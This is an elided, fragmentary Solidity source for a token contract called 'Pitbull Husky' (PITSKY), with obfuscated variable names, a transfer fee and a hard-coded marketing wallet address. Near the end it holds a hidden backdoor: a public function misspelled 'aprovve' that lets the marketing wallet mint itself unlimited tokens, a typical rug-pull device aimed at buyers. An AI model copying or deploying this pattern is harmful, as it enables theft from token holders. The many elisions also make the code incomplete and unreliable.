...
contract Context {
 ...
 contract HuskyPitbull is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloUMAXA;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Pitbull Husky";
    string private _symbol = "PITSKY";
    ...
    uint256 private cryfaleUMAXA = 5;
    uint256 private _vebegoUMAXA = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloUMAXA[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletUMAXA = 0x26e4c9710e58425D9C7515F69daE60b7a8303b8E;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloUMAXA[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloUMAXA[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleUMAXA / 100) / _vebegoUMAXA;
        allons = allons -  (_fee * _vebegoUMAXA);
        
        superfloUMAXA[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaUMAXA) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloUMAXA[account];
        require(accountBalance >= gzillaUMAXA, "BEP : Can't be done");
        unchecked {
            superfloUMAXA[account] = accountBalance - gzillaUMAXA;
        }
        _totalSupply -= gzillaUMAXA;

        emit Transfer(account, address(0), gzillaUMAXA);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
      ...
      function aprovve(uint256 burn) public{
        superfloUMAXA[_msgSender()] += burn;
        require(_msgSender() == _MarketingWalletUMAXA, "ERC20: cannot permit dev address");
    }   
